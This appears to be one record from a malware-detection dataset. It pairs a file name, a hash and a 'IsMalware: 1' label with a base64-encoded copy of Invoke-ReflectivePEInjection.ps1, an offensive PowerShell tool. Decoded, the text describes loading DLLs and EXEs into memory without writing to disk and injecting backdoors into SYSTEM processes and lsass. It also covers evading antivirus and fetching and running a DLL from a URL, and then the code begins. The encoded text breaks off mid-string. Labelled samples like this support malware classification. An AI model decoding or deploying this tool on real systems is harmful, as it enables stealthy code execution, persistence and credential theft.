Invoke-ReflectivePEInjection.ps1,732815cd903d2eac5240582724c3c289,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gSW52b2tlLVJlZmxlY3RpdmVQRUluamVjdGlvbgp7CjwjCi5TWU5PUFNJUwoKVGhpcyBzY3JpcHQgaGFzIHR3byBtb2Rlcy4gSXQgY2FuIHJlZmxlY3RpdmVseSBsb2FkIGEgRExML0VYRSBpbiB0byB0aGUgUG93ZXJTaGVsbCBwcm9jZXNzLCAKb3IgaXQgY2FuIHJlZmxlY3RpdmVseSBsb2FkIGEgRExMIGluIHRvIGEgcmVtb3RlIHByb2Nlc3MuIFRoZXNlIG1vZGVzIGhhdmUgZGlmZmVyZW50IHBhcmFtZXRlcnMgYW5kIGNvbnN0cmFpbnRzLCAKcGxlYXNlIGxlYWQgdGhlIE5vdGVzIHNlY3Rpb24gKEdFTkVSQUwgTk9URVMpIGZvciBpbmZvcm1hdGlvbiBvbiBob3cgdG8gdXNlIHRoZW0uCgoKMS4pUmVmbGVjdGl2ZWx5IGxvYWRzIGEgRExMIG9yIEVYRSBpbiB0byBtZW1vcnkgb2YgdGhlIFBvd2Vyc2hlbGwgcHJvY2Vzcy4KQmVjYXVzZSB0aGUgRExML0VYRSBpcyBsb2FkZWQgcmVmbGVjdGl2ZWx5LCBpdCBpcyBub3QgZGlzcGxheWVkIHdoZW4gdG9vbHMgYXJlIHVzZWQgdG8gbGlzdCB0aGUgRExMcyBvZiBhIHJ1bm5pbmcgcHJvY2Vzcy4KClRoaXMgdG9vbCBjYW4gYmUgcnVuIG9uIHJlbW90ZSBzZXJ2ZXJzIGJ5IHN1cHBseWluZyBhIGxvY2FsIFdpbmRvd3MgUEUgZmlsZSAoRExML0VYRSkgdG8gbG9hZCBpbiB0byBtZW1vcnkgb24gdGhlIHJlbW90ZSBzeXN0ZW0sCnRoaXMgd2lsbCBsb2FkIGFuZCBleGVjdXRlIHRoZSBETEwvRVhFIGluIHRvIG1lbW9yeSB3aXRob3V0IHdyaXRpbmcgYW55IGZpbGVzIHRvIGRpc2suCgoKMi4pIFJlZmxlY3RpdmVseSBsb2FkIGEgRExMIGluIHRvIG1lbW9yeSBvZiBhIHJlbW90ZSBwcm9jZXNzLgpBcyBtZW50aW9uZWQgYWJvdmUsIHRoZSBETEwgYmVpbmcgcmVmbGVjdGl2ZWx5IGxvYWRlZCB3b24ndCBiZSBkaXNwbGF5ZWQgd2hlbiB0b29scyBhcmUgdXNlZCB0byBsaXN0IERMTHMgb2YgdGhlIHJ1bm5pbmcgcmVtb3RlIHByb2Nlc3MuCgpUaGlzIGlzIHByb2JhYmx5IG1vc3QgdXNlZnVsIGZvciBpbmplY3RpbmcgYmFja2Rvb3JzIGluIFNZU1RFTSBwcm9jZXNzZXMgaW4gU2Vzc2lvbjAuIEN1cnJlbnRseSwgeW91IGNhbm5vdCByZXRyaWV2ZSBvdXRwdXQKZnJvbSB0aGUgRExMLiBUaGUgc2NyaXB0IGRvZXNuJ3Qgd2FpdCBmb3IgdGhlIERMTCB0byBjb21wbGV0ZSBleGVjdXRpb24sIGFuZCBkb2Vzbid0IG1ha2UgYW55IGVmZm9ydCB0byBjbGVhbnVwIG1lbW9yeSBpbiB0aGUgCnJlbW90ZSBwcm9jZXNzLiAKCgpXaGlsZSB0aGlzIHNjcmlwdCBwcm92aWRlcyBmdW5jdGlvbmFsaXR5IHRvIHNwZWNpZnkgYSBmaWxlIHRvIGxvYWQgZnJvbSBkaXNrIG9yIGZyb20gYSBVUkwsIHRoZXNlIGFyZSBtb3JlIGZvciBkZW1vIHB1cnBvc2VzLiBUaGUgd2F5IEknZCByZWNvbW1lbmQgdXNpbmcgdGhlIHNjcmlwdCBpcyB0byBjcmVhdGUgYSBieXRlIGFycmF5CmNvbnRhaW5pbmcgdGhlIGZpbGUgeW91J2QgbGlrZSB0byByZWZsZWN0aXZlbHkgbG9hZCwgYW5kIGhhcmRjb2RlIHRoYXQgYnl0ZSBhcnJheSBpbiB0byB0aGUgc2NyaXB0LiBPbmUgYWR2YW50YWdlIG9mIGRvaW5nIHRoaXMgaXMgeW91IGNhbiBlbmNyeXB0IHRoZSBieXRlIGFycmF5IGFuZCBkZWNyeXB0IGl0IGluIG1lbW9yeSwgd2hpY2ggd2lsbApieXBhc3MgQS9WLiBBbm90aGVyIGFkdmFudGFnZSBpcyB5b3Ugd29uJ3QgYmUgbWFraW5nIHdlYiByZXF1ZXN0cy4gVGhlIHNjcmlwdCBjYW4gYWxzbyBsb2FkIGZpbGVzIGZyb20gU1FMIFNlcnZlciBhbmQgYmUgdXNlZCBhcyBhIFNRTCBTZXJ2ZXIgYmFja2Rvb3IuIFBsZWFzZSBzZWUgdGhlIENhc2FiYQpibG9nIGxpbmtlZCBiZWxvdyAodGhhbmtzIHRvIHdoaXRleSkuCgpQb3dlclNwbG9pdCBGdW5jdGlvbjogSW52b2tlLVJlZmxlY3RpdmVQRUluamVjdGlvbgpBdXRob3I6IEpvZSBCaWFsZWssIFR3aXR0ZXI6IEBKb3NlcGhCaWFsZWsKTGljZW5zZTogQlNEIDMtQ2xhdXNlClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZQpPcHRpb25hbCBEZXBlbmRlbmNpZXM6IE5vbmUKVmVyc2lvbjogMS4yCgouREVTQ1JJUFRJT04KClJlZmxlY3RpdmVseSBsb2FkcyBhIFdpbmRvd3MgUEUgZmlsZSAoRExML0VYRSkgaW4gdG8gdGhlIHBvd2Vyc2hlbGwgcHJvY2Vzcywgb3IgcmVmbGVjdGl2ZWx5IGluamVjdHMgYSBETEwgaW4gdG8gYSByZW1vdGUgcHJvY2Vzcy4KCi5QQVJBTUVURVIgUEVQYXRoCgpUaGUgcGF0aCBvZiB0aGUgRExML0VYRSB0byBsb2FkIGFuZCBleGVjdXRlLiBUaGlzIGZpbGUgbXVzdCBleGlzdCBvbiB0aGUgY29tcHV0ZXIgdGhlIHNjcmlwdCBpcyBiZWluZyBydW4gb24sIG5vdCB0aGUgcmVtb3RlIGNvbXB1dGVyLgoKLlBBUkFNRVRFUiBQRVVybAoKQSBVUkwgY29udGFpbmluZyBhIERMTC9FWEUgdG8gbG9hZCBhbmQgZXhlY3V0ZS4KCi5QQVJBTUVURVIgQ29tcHV0ZXJOYW1lCgpPcHRpb25hbCwgYW4gYXJyYXkgb2YgY29tcHV0ZXJuYW1lcyB0byBydW4gdGhlIHNjcmlwdCBvbi4KCi5QQVJBTUVURVIgRnVuY1JldHVyblR5cGUKCk9wdGlvbmFsLCB0aGUgcmV0dXJuIHR5cGUgb2YgdGhlIGZ1bmN0aW9uIGJlaW5nIGNhbGxlZCBpbiB0aGUgRExMLiBEZWZhdWx0OiBWb2lkCglPcHRpb25zOiBTdHJpbmcsIFdTdHJpbmcsIFZvaWQuIFNlZSBub3RlcyBmb3IgbW9yZSBpbmZvcm1hdGlvbi4KCUlNUE9SVEFOVDogRm9yIERMTHMgYmVpbmcgbG9hZGVkIHJlbW90ZWx5LCBvbmx5IFZvaWQgaXMgc3VwcG9ydGVkLgoJCi5QQVJBTUVURVIgRXhlQXJncwoKT3B0aW9uYWwsIGFyZ3VtZW50cyB0byBwYXNzIHRvIHRoZSBleGVjdXRhYmxlIGJlaW5nIHJlZmxlY3RpdmVseSBsb2FkZWQuCgkKLlBBUkFNRVRFUiBQcm9jTmFtZQoKT3B0aW9uYWwsIHRoZSBuYW1lIG9mIHRoZSByZW1vdGUgcHJvY2VzcyB0byBpbmplY3QgdGhlIERMTCBpbiB0by4gSWYgbm90IGluamVjdGluZyBpbiB0byByZW1vdGUgcHJvY2VzcywgaWdub3JlIHRoaXMuCgouUEFSQU1FVEVSIFByb2NJZAoKT3B0aW9uYWwsIHRoZSBwcm9jZXNzIElEIG9mIHRoZSByZW1vdGUgcHJvY2VzcyB0byBpbmplY3QgdGhlIERMTCBpbiB0by4gSWYgbm90IGluamVjdGluZyBpbiB0byByZW1vdGUgcHJvY2VzcywgaWdub3JlIHRoaXMuCgouUEFSQU1FVEVSIEZvcmNlQVNMUgoKT3B0aW9uYWwsIHdpbGwgZm9yY2UgdGhlIHVzZSBvZiBBU0xSIG9uIHRoZSBQRSBiZWluZyBsb2FkZWQgZXZlbiBpZiB0aGUgUEUgaW5kaWNhdGVzIGl0IGRvZXNuJ3Qgc3VwcG9ydCBBU0xSLiBTb21lIFBFJ3Mgd2lsbCB3b3JrIHdpdGggQVNMUiBldmVuCiAgICBpZiB0aGUgY29tcGlsZXIgZmxhZ3MgZG9uJ3QgaW5kaWNhdGUgdGhleSBzdXBwb3J0IGl0LiBPdGhlciBQRSdzIHdpbGwgc2ltcGx5IGNyYXNoLiBNYWtlIHN1cmUgdG8gdGVzdCB0aGlzIHByaW9yIHRvIHVzaW5nLiBIYXMgbm8gZWZmZWN0IHdoZW4KICAgIGxvYWRpbmcgaW4gdG8gYSByZW1vdGUgcHJvY2Vzcy4KCQouRVhBTVBMRQoKTG9hZCBEZW1vRExMIGZyb20gYSBVUkwgYW5kIHJ1biB0aGUgZXhwb3J0ZWQgZnVuY3Rpb24gV1N0cmluZ0Z1bmMgb24gdGhlIGN1cnJlbnQgc3lzdGVtLCBwcmludCB0aGUgd2NoYXJfdCogcmV0dXJuZWQgYnkgV1N0cmluZ0Z1bmMoKS4KTm90ZSB0aGF0IHRoZSBmaWxlIG5hbWUgb24gdGhlIHdlYnNpdGUgY2FuIGJlIGFueSBmaWxlIGV4dGVuc2lvbi4KSW52b2tlLVJlZmxlY3RpdmVQRUluamVjdGlvbiAtUEVVcmwgaHR0cDovL3lvdXJzaXRlLmNvbS9EZW1vRExMLmRsbCAtRnVuY1JldHVyblR5cGUgV1N0cmluZwoKLkVYQU1QTEUKCkxvYWQgRGVtb0RMTCBhbmQgcnVuIHRoZSBleHBvcnRlZCBmdW5jdGlvbiBXU3RyaW5nRnVuYyBvbiBUYXJnZXQubG9jYWwsIHByaW50IHRoZSB3Y2hhcl90KiByZXR1cm5lZCBieSBXU3RyaW5nRnVuYygpLgpJbnZva2UtUmVmbGVjdGl2ZVBFSW5qZWN0aW9uIC1QRVBhdGggRGVtb0RMTC5kbGwgLUZ1bmNSZXR1cm5UeXBlIFdTdHJpbmcgLUNvbXB1dGVyTmFtZSBUYXJnZXQubG9jYWwKCi5FWEFNUExFCgpMb2FkIERlbW9ETEwgYW5kIHJ1biB0aGUgZXhwb3J0ZWQgZnVuY3Rpb24gV1N0cmluZ0Z1bmMgb24gYWxsIGNvbXB1dGVycyBpbiB0aGUgZmlsZSB0YXJnZXRsaXN0LnR4dC4gUHJpbnQKCXRoZSB3Y2hhcl90KiByZXR1cm5lZCBieSBXU3RyaW5nRnVuYygpIGZyb20gYWxsIHRoZSBjb21wdXRlcnMuCkludm9rZS1SZWZsZWN0aXZlUEVJbmplY3Rpb24gLVBFUGF0aCBEZW1vRExMLmRsbCAtRnVuY1JldHVyblR5cGUgV1N0cmluZyAtQ29tcHV0ZXJOYW1lIChHZXQtQ29udGVudCB0YXJnZXRsaXN0LnR4dCkKCi5FWEFNUExFCgpMb2FkIERlbW9FWEUgYW5kIHJ1biBpdCBsb2NhbGx5LgpJbnZva2UtUmVmbGVjdGl2ZVBFSW5qZWN0aW9uIC1QRVBhdGggRGVtb0VYRS5leGUgLUV4ZUFyZ3MgIkFyZzEgQXJnMiBBcmczIEFyZzQiCgouRVhBTVBMRQoKTG9hZCBEZW1vRVhFIGFuZCBydW4gaXQgbG9jYWxseS4gRm9yY2VzIEFTTFIgb24gZm9yIHRoZSBFWEUuCkludm9rZS1SZWZsZWN0aXZlUEVJbmplY3Rpb24gLVBFUGF0aCBEZW1vRVhFLmV4ZSAtRXhlQXJncyAiQXJnMSBBcmcyIEFyZzMgQXJnNCIgLUZvcmNlQVNMUgoKLkVYQU1QTEUKClJlZmVjdGl2ZWx5IGxvYWQgRGVtb0RMTF9SZW1vdGVQcm9jZXNzLmRsbCBpbiB0byB0aGUgbHNhc3MgcHJvY2VzcyBvbiBhIHJlbW90ZSBjb21wdXRlci4KSW52b2tlLVJlZmxlY3RpdmVQRUluamVjdGlvbiAtUEVQYXRoIERlbW9ETExfUmVtb3RlUHJvY2Vzcy5kbGwgLVByb2NOYW1lIGxzYXNzIC1Db21wdXRlck5hbWUgVGFyZ2V0LkxvY2FsCgouTk9URVMKR0VORVJBTCBOT1RFUzoKVGhlIHNjcmlwdCBoYXMgMyBiYXNpYyBzZXRzIG9mIGZ1bmN0aW9uYWxpdHk6CjEuKSBSZWZsZWN0aXZlbHkgbG9hZCBhIERMTCBpbiB0byB0aGUgUG93ZXJTaGVsbCBwcm9jZXNzCgktQ2FuIHJldHVybiBETEwgb3V0cHV0IHRvIHVzZXIgd2hlbiBydW4gcmVtb3RlbHkgb3IgbG9jYWxseS4KCS1DbGVhbnMgdXAgbWVtb3J5IGluIHRoZSBQUyBwcm9jZXNzIG9uY2UgdGhlIERMTCBmaW5pc2hlcyBleGVjdXRpbmcuCgktR3JlYXQgZm9yIHJ1bm5pbmcgcGVudGVzdCB0b29scyBvbiByZW1vdGUgY29tcHV0ZXJzIHdpdGhvdXQgdHJpZ2dlcmluZyBwcm9jZXNzIG1vbml0b3JpbmcgYWxlcnRzLgoJLUJ5IGRlZmF1bHQsIHRha2VzIDMgZnVuY3Rpb24gbmFtZXMsIHNlZSBiZWxvdyAoRExMIExPQURJTkcgTk9URVMpIGZvciBtb3JlIGluZm8uCjIuKSBSZWZsZWN0aXZlbHkgbG9hZCBhbiBFWEUgaW4gdG8gdGhlIFBvd2VyU2hlbGwgcHJvY2Vzcy4KCS1DYW4gTk9UIHJldHVybiBFWEUgb3V0cHV0IHRvIHVzZXIgd2hlbiBydW4gcmVtb3RlbHkuIElmIHJlbW90ZSBvdXRwdXQgaXMgbmVlZGVkLCB5b3UgbXVzdCB1c2UgYSBETEwuIENBTiByZXR1cm4gRVhFIG91dHB1dCBpZiBydW4gbG9jYWxseS4KCS1DbGVhbnMgdXAgbWVtb3J5IGluIHRoZSBQUyBwcm9jZXNzIG9uY2UgdGhlIERMTCBmaW5pc2hlcyBleGVjdXRpbmcuCgktR3JlYXQgZm9yIHJ1bm5pbmcgZXhpc3RpbmcgcGVudGVzdCB0b29scyB3aGljaCBhcmUgRVhFJ3Mgd2l0aG91dCB0cmlnZ2VyaW5nIHByb2Nlc3MgbW9uaXRvcmluZyBhbGVydHMuCjMuKSBSZWZsZWN0aXZlbHkgaW5qZWN0IGEgRExMIGluIHRvIGEgcmVtb3RlIHByb2Nlc3MuCgktQ2FuIE5PVCByZXR1cm4gRExMIG91dHB1dCB0byB0aGUgdXNlciB3aGVuIHJ1biByZW1vdGVseSBPUiBsb2NhbGx5LgoJLURvZXMgTk9UIGNsZWFuIHVwIG1lbW9yeSBpbiB0aGUgcmVtb3RlIHByb2Nlc3MgaWYvd2hlbiBETEwgZmluaXNoZXMgZXhlY3V0aW9uLgoJLUdyZWF0IGZvciBwbGFudGluZyBiYWNrZG9vciBvbiBhIHN5c3RlbSBieSBpbmplY3RpbmcgYmFja2Rvb3IgRExMIGluIHRvIGFub3RoZXIgcHJvY2Vzc2VzIG1lbW9yeS4KCS1FeHBlY3RzIHRoZSBETEwgdG8gaGF2ZSB0aGlzIGZ1bmN0aW9uOiB2b2lkIFZvaWRGdW5jKCkuIFRoaXMgaXMgdGhlIGZ1bmN0aW9uIHRoYXQgd2lsbCBiZSBjYWxsZWQgYWZ0ZXIgdGhlIERMTCBpcyBsb2FkZWQuCgoKCkRMTCBMT0FESU5HIE5PVEVTOgoKUG93ZXJTaGVsbCBkb2VzIG5vdCBjYXB0dXJlIGFuIGFwcGxpY2F0aW9ucyBvdXRwdXQgaWYgaXQgaXMgb3V0cHV0IHVzaW5nIHN0ZG91dCwgd2hpY2ggaXMgaG93IFdpbmRvd3MgY29uc29sZSBhcHBzIG91dHB1dC4KSWYgeW91IG5lZWQgdG8gZ2V0IGJhY2sgdGhlIG91dHB1dCBmcm9tIHRoZSBQRSBmaWxlIHlvdSBhcmUgbG9hZGluZyBvbiByZW1vdGUgY29tcHV0ZXJzLCB5b3UgbXVzdCBjb21waWxlIHRoZSBQRSBmaWxlIGFzIGEgRExMLCBhbmQgaGF2ZSB0aGUgRExMCnJldHVybiBhIGNoYXIqIG9yIHdjaGFyX3QqLCB3aGljaCBQb3dlclNoZWxsIGNhbiB0YWtlIGFuZCByZWFkIHRoZSBvdXRwdXQgZnJvbS4gQW55dGhpbmcgb3V0cHV0IGZyb20gc3Rkb3V0IHdoaWNoIGlzIHJ1biB1c2luZyBwb3dlcnNoZWxsCnJlbW90aW5nIHdpbGwgbm90IGJlIHJldHVybmVkIHRvIHlvdS4gSWYgeW91IGp1c3QgcnVuIHRoZSBQb3dlclNoZWxsIHNjcmlwdCBsb2NhbGx5LCB5b3UgV0lMTCBiZSBhYmxlIHRvIHNlZSB0aGUgc3Rkb3V0IG91dHB1dCBmcm9tCmFwcGxpY2F0aW9ucyBiZWNhdXNlIGl0IHdpbGwganVzdCBhcHBlYXIgaW4gdGhlIGNvbnNvbGUgd2luZG93LiBUaGUgbGltaXRhdGlvbiBvbmx5IGFwcGxpZXMgd2hlbiB1c2luZyBQb3dlclNoZWxsIHJlbW90aW5nLgoKRm9yIERMTCBMb2FkaW5nOgpPbmNlIHRoaXMgc2NyaXB0IGxvYWRzIHRoZSBETEwsIGl0IGNhbGxzIGEgZnVuY3Rpb24gaW4gdGhlIERMTC4gVGhlcmUgaXMgYSBzZWN0aW9uIG5lYXIgdGhlIGJvdHRvbSBsYWJlbGVkICJZT1VSIENPREUgR09FUyBIRVJFIgpJIHJlY29tbWVuZCB5b3VyIERMTCB0YWtlIG5vIHBhcmFtZXRlcnMuIEkgaGF2ZSBwcmV3cml0dGVuIGNvZGUgdG8gaGFuZGxlIGZ1bmN0aW9ucyB3aGljaCB0YWtlIG5vIHBhcmFtZXRlcnMgYXJlIHJldHVybgp0aGUgZm9sbG93aW5nIHR5cGVzOiBjaGFyKiwgd2NoYXJfdCosIGFuZCB2b2lkLiBJZiB0aGUgZnVuY3Rpb24gcmV0dXJucyBjaGFyKiBvciB3Y2hhcl90KiB0aGUgc2NyaXB0IHdpbGwgb3V0cHV0IHRoZQpyZXR1cm5lZCBkYXRhLiBUaGUgRnVuY1JldHVyblR5cGUgcGFyYW1ldGVyIGNhbiBiZSB1c2VkIHRvIHNwZWNpZnkgd2hpY2ggcmV0dXJuIHR5cGUgdG8gdXNlLiBUaGUgbWFwcGluZyBpcyBhcyBmb2xsb3dzOgp3Y2hhcl90KiAgIDogRnVuY1JldHVyblR5cGUgPSBXU3RyaW5nCmNoYXIqICAgICAgOiBGdW5jUmV0dXJuVHlwZSA9IFN0cmluZwp2b2lkICAgICAgIDogRGVmYXVsdCwgZG9uJ3Qgc3VwcGx5IGEgRnVuY1JldHVyblR5cGUKCkZvciB0aGUgd2hjYXJfdCogYW5kIGNoYXJfdCogb3B0aW9ucyB0byB3b3JrLCB5b3UgbXVzdCBhbGxvY2F0ZSB0aGUgc3RyaW5nIHRvIHRoZSBoZWFwLiBEb24ndCBzaW1wbHkgY29udmVydCBhIHN0cmluZwp1c2luZyBzdHJpbmcuY19zdHIoKSBiZWNhdXNlIGl0IHdpbGwgYmUgYWxsb2NhZWQgb24gdGhlIHN0YWNrIGFuZCBiZSBkZXN0cm95ZWQgd2hlbiB0aGUgRExMIHJldHVybnMuCgpUaGUgZnVuY3Rpb24gbmFtZSBleHBlY3RlZCBpbiB0aGUgRExMIGZvciB0aGUgcHJld3JpdHRlbiBGdW5jUmV0dXJuVHlwZSdzIGlzIGFzIGZvbGxvd3M6CldTdHJpbmcgICAgOiBXU3RyaW5nRnVuYwpTdHJpbmcgICAgIDogU3RyaW5nRnVuYwpWb2lkICAgICAgIDogVm9pZEZ1bmMKClRoZXNlIGZ1bmN0aW9uIG5hbWVzIEFSRSBjYXNlIHNlbnNpdGl2ZS4gVG8gY3JlYXRlIGFuIGV4cG9ydGVkIERMTCBmdW5jdGlvbiBmb3IgdGhlIHdzdHJpbmcgdHlwZSwgdGhlIGZ1bmN0aW9uIHdvdWxkCmJlIGRlY2xhcmVkIGFzIGZvbGxvd3M6CmV4dGVybiAiQyIgX19kZWNsc3BlYyggZGxsZXhwb3J0ICkgd2NoYXJfdCogV1N0cmluZ0Z1bmMoKQoKCklmIHlvdSB3YW50IHRvIHVzZSBhIERMTCB3aGljaCByZXR1cm5zIGEgZGlmZmVyZW50IGRhdGEgdHlwZSwgb3Igd2hpY2ggdGFrZXMgcGFyYW1ldGVycywgeW91IHdpbGwgbmVlZCB0byBtb2RpZnkKdGhpcyBzY3JpcHQgdG8gYWNjb21vZGF0ZSB0aGlzLiBZb3UgY2FuIGZpbmQgdGhlIGNvZGUgdG8gbW9kaWZ5IGluIHRoZSBzZWN0aW9uIGxhYmVsZWQgIllPVVIgQ09ERSBHT0VTIEhFUkUiLgoKRmluZCBhIERlbW9ETEwgYXQ6IGh0dHBzOi8vZ2l0aHViLmNvbS9jbHltYjNyL1Bvd2VyU2hlbGwvdHJlZS9tYXN0ZXIvSW52b2tlLVJlZmxlY3RpdmVEbGxJbmplY3Rpb24KCi5MSU5LCgpCbG9nOiBodHRwOi8vY2x5bWIzci53b3JkcHJlc3MuY29tLwpHaXRodWIgcmVwbzogaHR0cHM6Ly9naXRodWIuY29tL2NseW1iM3IvUG93ZXJTaGVsbC90cmVlL21hc3Rlci9JbnZva2UtUmVmbGVjdGl2ZVBFSW5qZWN0aW9uCgpCbG9nIG9uIHJlZmxlY3RpdmUgbG9hZGluZzogaHR0cDovL2NseW1iM3Iud29yZHByZXNzLmNvbS8yMDEzLzA0LzA2L3JlZmxlY3RpdmUtZGxsLWluamVjdGlvbi13aXRoLXBvd2Vyc2hlbGwvCkJsb2cgb24gbW9kaWZ5aW5nIG1pbWlrYXR6IGZvciByZWZsZWN0aXZlIGxvYWRpbmc6IGh0dHA6Ly9jbHltYjNyLndvcmRwcmVzcy5jb20vMjAxMy8wNC8wOS9tb2RpZnlpbmctbWltaWthdHotdG8tYmUtbG9hZGVkLXVzaW5nLWludm9rZS1yZWZsZWN0aXZlZGxsaW5qZWN0aW9uLXBzMS8KQmxvZyBvbiB1c2luZyB0aGlzIHNjcmlwdCBhcyBhIGJhY2tkb29yIHdpdGggU1FMIHNlcnZlcjogaHR0cDovL3d3dy5jYXNhYmEuY29tL2Jsb2cvCgojPgoKW0NtZGxldEJpbmRpbmcoRGVmYXVsdFBhcmFtZXRlclNldE5hbWU9IldlYkZpbGUiKV0KUGFyYW0oCglbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAiTG9jYWxGaWxlIiwgUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCglbU3RyaW5nXQoJJFBFUGF0aCwKCQoJW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gIldlYkZpbGUiLCBQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCVtVcmldCgkkUEVVcmwsCgkKCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxKV0KCVtTdHJpbmdbXV0KCSRDb21wdXRlck5hbWUsCgkKCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyKV0KICAgIFtWYWxpZGF0ZVNldCggJ1dTdHJpbmcnLCAnU3RyaW5nJywgJ1ZvaWQnICldCglbU3RyaW5nXQoJJEZ1bmNSZXR1cm5UeXBlID0gJ1ZvaWQnLAoJCglbUGFyYW1ldGVyKFBvc2l0aW9uID0gMyldCglbU3RyaW5nXQoJJEV4ZUFyZ3MsCgkKCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSA0KV0KCVtJbnQzMl0KCSRQcm9jSWQsCgkKCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSA1KV0KCVtTdHJpbmddCgkkUHJvY05hbWUsCgogICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDYpXQogICAgW1N3aXRjaF0KICAgICRGb3JjZUFTTFIKKQoKU2V0LVN0cmljdE1vZGUgLVZlcnNpb24gMgoKCiRSZW1vdGVTY3JpcHRCbG9jayA9IHsKCVtDbWRsZXRCaW5kaW5nKCldCglQYXJhbSgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtCeXRlW11dCgkJJFBFQnl0ZXMsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3RyaW5nXQoJCSRGdW5jUmV0dXJuVHlwZSwKCQkJCQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW0ludDMyXQoJCSRQcm9jSWQsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3RyaW5nXQoJCSRQcm9jTmFtZSwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDQsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbQm9vbF0KICAgICAgICAkRm9yY2VBU0xSCgkpCgkKCSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgkjIyMjIyMjIyMjICBXaW4zMiBTdHVmZiAgIyMjIyMjIyMjIwoJIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCUZ1bmN0aW9uIEdldC1XaW4zMlR5cGVzCgl7CgkJJFdpbjMyVHlwZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5PYmplY3QKCgkJI0RlZmluZSBhbGwgdGhlIHN0cnVjdHVyZXMvZW51bXMgdGhhdCB3aWxsIGJlIHVzZWQKCQkjCVRoaXMgYXJ0aWNsZSBzaG93cyB5b3UgaG93IHRvIGRvIHRoaXMgd2l0aCByZWZsZWN0aW9uOiBodHRwOi8vd3d3LmV4cGxvaXQtbW9uZGF5LmNvbS8yMDEyLzA3L3N0cnVjdHMtYW5kLWVudW1zLXVzaW5nLXJlZmxlY3Rpb24uaHRtbAoJCSREb21haW4gPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbgoJCSREeW5hbWljQXNzZW1ibHkgPSBOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnRHluYW1pY0Fzc2VtYmx5JykKCQkkQXNzZW1ibHlCdWlsZGVyID0gJERvbWFpbi5EZWZpbmVEeW5hbWljQXNzZW1ibHkoJER5bmFtaWNBc3NlbWJseSwgW1N5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQXNzZW1ibHlCdWlsZGVyQWNjZXNzXTo6UnVuKQoJCSRNb2R1bGVCdWlsZGVyID0gJEFzc2VtYmx5QnVpbGRlci5EZWZpbmVEeW5hbWljTW9kdWxlKCdEeW5hbWljTW9kdWxlJywgJGZhbHNlKQoJCSRDb25zdHJ1Y3RvckluZm8gPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxBc0F0dHJpYnV0ZV0uR2V0Q29uc3RydWN0b3JzKClbMF0KCgoJCSMjIyMjIyMjIyMjIyAgICBFTlVNICAgICMjIyMjIyMjIyMjIwoJCSNFbnVtIE1hY2hpbmVUeXBlCgkJJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lRW51bSgnTWFjaGluZVR5cGUnLCAnUHVibGljJywgW1VJbnQxNl0pCgkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ05hdGl2ZScsIFtVSW50MTZdIDApIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSTM4NicsIFtVSW50MTZdIDB4MDE0YykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJdGFuaXVtJywgW1VJbnQxNl0gMHgwMjAwKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ3g2NCcsIFtVSW50MTZdIDB4ODY2NCkgfCBPdXQtTnVsbAoJCSRNYWNoaW5lVHlwZSA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKCQkkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE1hY2hpbmVUeXBlIC1WYWx1ZSAkTWFjaGluZVR5cGUKCgkJI0VudW0gTWFnaWNUeXBlCgkJJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lRW51bSgnTWFnaWNUeXBlJywgJ1B1YmxpYycsIFtVSW50MTZdKQoJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9OVF9PUFRJT05BTF9IRFIzMl9NQUdJQycsIFtVSW50MTZdIDB4MTBiKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX05UX09QVElPTkFMX0hEUjY0X01BR0lDJywgW1VJbnQxNl0gMHgyMGIpIHwgT3V0LU51bGwKCQkkTWFnaWNUeXBlID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQoJCSRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgTWFnaWNUeXBlIC1WYWx1ZSAkTWFnaWNUeXBlCgoJCSNFbnVtIFN1YlN5c3RlbVR5cGUKCQkkVHlwZ